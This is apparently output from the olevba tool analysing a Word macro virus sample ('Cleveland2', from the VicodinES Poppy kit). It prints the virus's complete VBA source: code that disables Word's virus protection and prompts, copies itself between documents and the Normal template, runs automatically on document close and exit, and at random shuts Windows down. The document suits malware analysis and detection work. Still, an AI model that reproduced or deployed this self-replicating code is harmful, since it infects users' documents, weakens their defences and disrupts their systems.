olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.VMPC-based-1afdca692364022d64da4429a9030d3df91b8dc3
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.VMPC-based-1afdca692364022d64da4429a9030d3df91b8dc3 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Cleveland2.bas 
in file: Virus.MSWord.VMPC-based-1afdca692364022d64da4429a9030d3df91b8dc3 - OLE stream: 'Macros/VBA/Cleveland2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Sub Cleveland2()
    
    'Produced by The VicodinES Macro.Poppy Construction Kit
    '======================================================
    'Code Written by VicodinES "Daddy's got a big o'l bag-a-chicken"
    'Poppy ID : 33903948-558
    
    
On Error Resume Next
Randomize
With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With
ActiveDocument.ReadOnlyRecommended = False
check = Int(Rnd * 10)
If check = 3 Then Call p837
rm = Int(Rnd * 100)
    If rm = 99 Then MsgBox "Cleveland Still Suxs", vbSystemModal
mpljre394833906 = 0
Set savower339039484 = MacroContainer
If savower339039484 = NormalTemplate Then mpljre394833906 = 1
If mpljre394833906 = 1 Then wqryuyt394811 = NormalTemplate.FullName Else wqryuyt394811 = ActiveDocument.FullName
If mpljre394833906 = 1 Then wrwetvz339010 = ActiveDocument.FullName Else wrwetvz339010 = NormalTemplate.FullName
Application.OrganizerCopy Source:=wqryuyt394811, Destination:=wrwetvz339010, Name:="Cleveland2", Object:=wdOrganizerObjectProjectItems
If mpljre394833906 = 1 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
If mpljre394833906 = 0 Then
     If NormalTemplate.Saved = False Then NormalTemplate.Save
     End If
fuckoff:
End Sub
Sub FileExit()
    On Error Resume Next
    Call Cleveland2
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub
Sub AutoExit()
    On Error Resume Next
    Call Cleveland2
End Sub
Sub AutoClose()
    On Error Resume Next
    Call Cleveland2
End Sub
Sub p837()
    On Error Resume Next
    If ActiveDocument.Saved = False Then ActiveDocument.Save
Tasks.ExitWindows
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

